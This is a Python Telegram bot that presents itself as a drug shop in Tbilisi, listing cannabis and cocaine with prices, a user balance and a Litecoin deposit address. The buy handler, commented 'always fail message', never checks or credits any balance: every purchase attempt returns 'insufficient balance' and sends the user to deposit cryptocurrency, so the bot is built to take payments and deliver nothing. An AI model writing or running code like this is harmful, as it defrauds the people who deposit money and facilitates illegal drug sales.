from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)

from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)

import os

TOKEN = os.getenv("BOT_TOKEN")

# USER BALANCES
user_balances = {}


# =========================
# START
# =========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user_id = update.effective_user.id

    if user_id not in user_balances:
        user_balances[user_id] = 0.00

    balance = user_balances[user_id]

    keyboard = [
        [InlineKeyboardButton("🍀 Weed", callback_data="voip")],
        [InlineKeyboardButton("💎 Drugs", callback_data="email")],
        [InlineKeyboardButton("💰 Deposit", callback_data="deposit")]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"""
🍓 Welcome to marwkvibot 🍓
    Very High Quality
    Addresses✅
    Available✅
    @marwkvibot
    /start

👤 User ID: {user_id}
💰 Balance: ₾{balance:.2f}
📍 Tbilisi
Choose product:
""",
        reply_markup=reply_markup
    )


# =========================
# CALLBACK HANDLER
# =========================
async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query
    user_id = query.from_user.id

    await query.answer()

    balance = user_balances.get(user_id, 0.00)

    # =========================
    # VOIP MENU
    # =========================
    if query.data == "voip":

        keyboard = [
            [InlineKeyboardButton("Afghan Kush 0.5G - Sanzona", callback_data="usa_numbers")],
            [InlineKeyboardButton("Afghan Kush 1G - Sanzona", callback_data="canada_numbers")],
            [InlineKeyboardButton("Afghan Kush 3G - Temka", callback_data="federal")],
            [InlineKeyboardButton("⬅ Back", callback_data="back")]
        ]

        await query.edit_message_text(
            f"🍀 Weed\n\n💰 Your Balance: ₾{balance:.2f}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # =========================
    # EMAIL MENU
    # =========================
    elif query.data == "email":

        keyboard = [
            [InlineKeyboardButton("Colombian Cocaine 1G - Temka", callback_data="sending")],
            [InlineKeyboardButton("⬅ Back", callback_data="back")]
        ]

        await query.edit_message_text(
            f"💎 Drugs\n\n💰 Your Balance: ₾{balance:.2f}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # =========================
    # PRODUCTS
    # =========================
    elif query.data == "federal":

        keyboard = [
            [InlineKeyboardButton("🛒 Buy Now", callback_data="buy_federal")],
            [InlineKeyboardButton("⬅ Back", callback_data="voip")]
        ]

        await query.edit_message_text(
            f"""
🍀 Afghan Kush 3G

💵 Price: 250₾ / Temka
💰 Your Balance: ${balance:.2f}
""",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif query.data == "usa_numbers":

        keyboard = [
            [InlineKeyboardButton("🛒 Buy Now", callback_data="buy_usa")],
            [InlineKeyboardButton("⬅ Back", callback_data="voip")]
        ]

        await query.edit_message_text(
            f"""
🍀 Afghan Kush 0.5G

💵 Price: 90₾ / Sanzona
💰 Your Balance: ₾{balance:.2f}
""",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif query.data == "canada_numbers":

        keyboard = [
            [InlineKeyboardButton("🛒 Buy Now", callback_data="buy_canada")],
            [InlineKeyboardButton("⬅ Back", callback_data="voip")]
        ]

        await query.edit_message_text(
            f"""
🍀 Afghan Kush 1G

💵 Price: 140₾ / Sanzona
💰 Your Balance: ₾{balance:.2f}
""",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif query.data == "sending":

        keyboard = [
            [InlineKeyboardButton("🛒 Buy Now", callback_data="buy_email")],
            [InlineKeyboardButton("⬅ Back", callback_data="email")]
        ]

        await query.edit_message_text(
            f"""
💎 Colombian Cocaine 1G

💵 Price: 350₾ / Temka
💰 Your Balance: ₾{balance:.2f}
""",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # =========================
    # BUY SYSTEM (NO BALANCE CHECK - ALWAYS FAIL MESSAGE)
    # =========================
    elif query.data in ["buy_federal", "buy_usa", "buy_canada", "buy_email"]:

        keyboard = [
            [InlineKeyboardButton("💰 Deposit Now", callback_data="deposit")]
        ]

        await query.message.reply_text(
            "❌ Insufficient balance. Please deposit funds to continue.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # =========================
    # DEPOSIT
    # =========================
    elif query.data == "deposit":

        await query.edit_message_text(
            f"""
💰 Deposit Balance

💵 Current Balance: ₾{balance:.2f}

📥 Send LTC (Litecoin) to this address:

```text
LRvMZHB6rYK2cbQWqJf2WhVgNbkUuceBDM

⚠ payment confirmation need 30 minutes maximum.
""",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅ Back", callback_data="back")]
            ])
        )

    # =========================
    # BACK
    # =========================
    elif query.data == "back":

        keyboard = [
            [InlineKeyboardButton("🍀 Weed", callback_data="voip")],
            [InlineKeyboardButton("💎 Drug", callback_data="email")],
            [InlineKeyboardButton("💰 Deposit", callback_data="deposit")]
        ]

        await query.edit_message_text(
            f"""
🍓 Welcome to marwkvibot 🍓
    Very High Quality
    Addresses✅
    Available✅
    @marwkvibot
    /start

👤 User ID: {user_id}
💰 Balance: ₾{balance:.2f}
📍 Tbilisi
Choose option:
""",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


# =========================
# RUN BOT
# =========================
app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(buttons))

print("Bot Running...")
app.run_polling()
